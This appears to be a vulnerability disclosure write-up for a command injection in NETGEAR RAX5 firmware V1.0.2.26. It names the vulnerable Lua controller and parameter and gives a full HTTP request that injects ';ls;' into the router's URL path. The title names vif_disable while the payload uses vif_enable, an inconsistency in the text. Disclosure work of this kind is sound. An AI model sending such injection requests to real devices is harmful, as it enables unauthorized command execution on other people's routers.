# NETGEAR RAX5 V1.0.2.26 Command Injection (vif_disable)

## Product Information

- Device: NETGEAR RAX5
- Firmware Version: V1.0.2.26
- Manufacturer's website information：https://www.netgear.com/
- Firmware download address ：https://www.downloads.netgear.com/files/GDC/RAX5/RAX5_V1.0.2.26_1.zip or https://www.netgear.com/support/download/?model=RAX5

![](./1.png)



## Vulnerability Description

In the `/usr/lib/lua/luci/controller/mtkwifi.lua` file, there is a **command injection vulnerability** in the `vif_disable` function via the `iface` parameter.

![](./2.png)

Entry: `/admin/mtk/wifi/vif_disable/arg`

![](./3.png)

## Payload

We can trigger this vulnerability by injecting the `ls` command using the following payload.

```http
GET /cgi-bin/luci/admin/mtk/wifi/vif_enable/;ls; HTTP/1.1
Host: 192.168.187.136
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: sysauth=2066ce7be48fd3ba36e4135e973cd840
```

After the injection, we can verify the result in the response.

![](./4.png)
